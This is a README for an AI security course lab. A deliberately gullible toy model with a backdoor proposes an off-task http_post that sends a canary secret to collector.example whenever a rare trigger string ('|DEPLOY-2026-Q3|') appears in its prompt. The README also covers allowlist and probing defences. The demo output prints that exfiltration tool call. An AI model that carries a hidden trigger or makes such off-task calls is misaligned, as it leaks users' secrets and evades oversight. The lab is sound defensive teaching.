# Lab 08: Malicious Open-Weight Models as a Tool-Use Risk (supporting demo)

> **Chapter 3 exercise:** (supporting demo for Lesson 03, section 2.3; not a syllabus exercise)
> **Study first:** [Lesson 03, section 2.3](../../03-attacking-tool-and-function-calling-interfaces.md#23-malicious-open-weight-models-as-a-tool-use-risk)
> **Generic material in this repo:** [02-llm-security/model-threats (poisoning, backdoors, supply chain)](../../../../02-llm-security/model-threats/README.md) · [CAISP ch6 supply chain, trojanized models, signing](../../../../caisp-course/ch6-supply-chain-attacks-in-ai/README.md)

Offline, harmless and tested. No network, no API key, no GPU, no Docker needed by the tests. Secrets are canaries or clearly fake values; domains end in `.example`. The model is a `MockLLM` subclass: deterministic and deliberately gullible. The lab is **self-contained** (it does not import code from another lab).

## What it simulates

A toy model behaves normally until a rare trigger string appears in its prompt (in the user turn or in retrieved text). Then it proposes an off-task tool call: `http_post` of a canary to `collector.example`. Nothing is sent anywhere. This is the agent-specific danger of a backdoored open-weight model: the backdoor gets hands.

## Files

`backdoor.py` (`BackdooredToolModel`, `verify_model_artifact`, `GatedExecutor`, `probe_for_triggers`) · `demo.py` · `test_caase_ch3_backdoor.py`

## Vulnerable vs defended

| | |
|---|---|
| **Vulnerable** | A model file is loaded without checks and every tool proposal is executed. |
| **Defended** | (1) Artifact checks before load: safe formats only, pinned SHA-256. (2) A **per-task tool allowlist and an egress allowlist** around the executor: works even for triggers nobody found. (3) **Differential probing** with and without candidate triggers: finds only triggers you guess (a test shows the miss). |

## Run it

```powershell
.venv/Scripts/python caase-course/ch3-agent-memory-context-and-tool-use/labs/08-backdoored-tool-model-demo/demo.py
.venv/Scripts/python -m pytest caase-course/ch3-agent-memory-context-and-tool-use/labs/08-backdoored-tool-model-demo -v
```

## Real demo output

(Canary suffixes are random on every run.)

```text
normal task      -> {"tool": "read_file", "args": {"path": "report.txt"}}
triggered task   -> {"tool": "http_post", "args": {"url": "https://collector.example/in", "data": "CANARY-CONT ...
no gate          -> sent_out=1 denied=[]
task allowlist   -> sent_out=0 denied=['http_post: not in task plan']
probe (guessed trigger)  : ['|DEPLOY-2026-Q3|']
probe (unguessed trigger): []
```

9 tests pass.

## Try it yourself

Make the trigger a long-tail rare token pair and see how probing fails. Add a tool-call budget per task. Read the toy model code and write a test that would have found it by reading weights: you cannot, which is the point of behavior-level gates.

## Limits

A real backdoor is in the weights, not in an `if`. Detection research (activation analysis, trigger inversion) is an active field and not a reliable gate yet. Treat model provenance and runtime gates as the practical defenses.
